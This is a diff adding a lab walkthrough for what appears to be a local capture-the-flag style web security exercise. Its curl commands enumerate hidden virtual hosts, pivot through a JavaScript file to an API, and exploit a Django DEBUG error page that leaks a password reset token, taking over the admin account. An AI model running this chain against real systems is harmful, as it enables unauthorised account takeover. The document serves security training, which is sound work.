@@ -1,0 +1,99 @@
+C00 - FULL CHAIN (THE WRITEUP END TO END)
+==========================================
+Lab      : c00-full-chain
+Case     : all (C1-C10), decoys on
+Ports    : HTTP 18180, HTTPS 18543
+Start    : make up LAB=c00-full-chain
+Verify   : make verify LAB=c00-full-chain      (20 assertions)
+
+OBJECTIVE
+  One IP, everything on: bare-IP wall, wildcard certificate, decoy vhosts, content
+  discovery, JS pivot, second vhost, Django DEBUG=True with broken SMTP, and the
+  keyword-routed portal. Walk it as the author did and finish with admin access.
+
+STEP 1 - the wall (C1)
+  curl -skI https://127.0.0.1:18543/ | grep -Ei 'HTTP/|server|content-length'
+  expected:
+    HTTP/1.1 404 Not Found
+    server: Microsoft-HTTPAPI/2.0
+    content-length: 0
+
+STEP 2 - the certificate (C2)
+  tlsx -u 127.0.0.1:18543 -san -cn -silent -json | jq '.subject_an'
+  expected: ["corp.lab","*.corp.lab"]
+
+STEP 3 - the hostname (C3)
+  for w in $(cat _shared/data/vhost-labels.txt); do
+    [ "$(curl -sk -o /dev/null -w '%{http_code}' -H "Host: $w.corp.lab" \
+        https://127.0.0.1:18543/robots.txt)" = 200 ] && echo "HIT $w.corp.lab"
+  done
+  expected: HIT chatadmin.corp.lab
+  (the other vhosts are byte-identical default pages; old-portal is a 403 bait)
+
+STEP 4 - the application (C4)
+  curl -sk -H 'Host: chatadmin.corp.lab' https://127.0.0.1:18543/robots.txt
+  expected: Disallow: /app
+  curl -sk -H 'Host: chatadmin.corp.lab' https://127.0.0.1:18543/chatadmin \
+    | grep -o 'Chat Admin'
+  expected: Chat Admin
+
+STEP 5 - the backend (C5)
+  curl -sk -H 'Host: chatadmin.corp.lab' \
+    https://127.0.0.1:18543/chatadmin/assets/app.js | grep API_BASE
+  expected: API_BASE: "https://chat-api.corp.lab/api"
+  curl -skI -H 'Host: chat-api.corp.lab' https://127.0.0.1:18543/nope | grep -i server
+  expected: server: Microsoft-IIS/10.0     (a site, not the wall)
+
+STEP 6 - the exploit (C7)
+  curl -sk -H 'Host: chat-api.corp.lab' -H 'Content-Type: application/json' \
+    -d '{"email":"admin@corp.lab"}' -o /tmp/500.html -w '%{http_code}\n' \
+    https://127.0.0.1:18543/api/auth/password_reset
+  expected: 500
+
+  TOKEN=$(grep -oE 'token=[0-9a-f]{32}' /tmp/500.html | head -1 | cut -d= -f2)
+  echo "$TOKEN"        # 32 hex chars, leaked in the drafted mail
+
+  curl -sk -H 'Host: chat-api.corp.lab' -H 'Content-Type: application/json' \
+    -d "{\"token\":\"$TOKEN\",\"password\":\"NewPass-Aa1!\"}" \
+    https://127.0.0.1:18543/api/auth/password_reset/confirm
+  expected: {"detail":"password updated"}
+
+  JWT=$(curl -sk -H 'Host: chat-api.corp.lab' -H 'Content-Type: application/json' \
+    -d '{"email":"admin@corp.lab","password":"NewPass-Aa1!"}' \
+    https://127.0.0.1:18543/api/auth/login | jq -r .token)
+  curl -sk -H 'Host: chat-api.corp.lab' -H "Authorization: Bearer $JWT" \
+    https://127.0.0.1:18543/api/chats | grep -o 'FLAG{[^}]*}'
+  expected: FLAG{full_chain_hidden_vhost_to_admin}   (value depends on the compose env)
+
+STEP 7 - the keyword app on the same IP (C10)
+  curl -skI -H 'Host: portal' https://127.0.0.1:18543/ | grep -i x-app
+  expected: x-app: portal
+  curl -sk -o /dev/null -w '%{http_code}\n' -H 'Host: portal.attacker.test' \
+    https://127.0.0.1:18543/
+  expected: 200        (no domain allowlist)
+  curl -sk -o /dev/null -w '%{http_code}\n' -H 'Host: portal.' https://127.0.0.1:18543/
+  expected: 404        (trailing-dot gap)
+
+STEP 8 - what the decoys prove
+  curl -sk -H 'Host: vpn.corp.lab' https://127.0.0.1:18543/ | shasum -a1
+  curl -sk -H 'Host: chatadmin.corp.lab' https://127.0.0.1:18543/ | shasum -a1
+  expected: identical hashes (same default page; only robots.txt/app differ)
+  curl -sk -o /dev/null -w '%{http_code}\n' -H 'Host: old-portal.corp.lab' \
+    https://127.0.0.1:18543/
+  expected: 403
+
+STEP 9 - the wall still holds
+  curl -skI -H 'Host: whoami.corp.lab' https://127.0.0.1:18543/ | grep -Ei 'HTTP/|server'
+  expected: 404 + server: Microsoft-HTTPAPI/2.0
+
+FINDINGS THIS CHAIN SUPPORTS
+  1. Password reset token disclosure -> account takeover. Critical. DEBUG=True plus
+     a failing mail path; the token is generated before delivery fails and the
+     technical page prints the drafted message.
+  2. Hidden vhost exposing an internal console. Impact only with (1); on its own it
+     is attack-surface expansion.
+  3. Keyword-routed app with no domain allowlist. Reportable only with the data or
+     operation you reach - which is why it needs the authenticated dashboard.
+
+TEARDOWN
+  make down LAB=c00-full-chain      (make reset LAB=c00-full-chain re-seeds)
